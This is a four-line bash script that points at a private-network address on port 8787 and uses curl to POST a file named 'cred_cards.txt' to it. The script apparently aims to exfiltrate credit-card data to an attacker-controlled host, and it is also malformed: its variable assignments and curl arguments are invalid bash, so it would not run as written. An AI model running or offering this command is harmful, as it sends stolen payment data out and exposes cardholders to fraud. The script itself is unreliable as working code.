#!/bin/bash

URL = http://172.19.208.47:8787
LFILE = cred_cards.txt
curl -X POST $LFILE $URL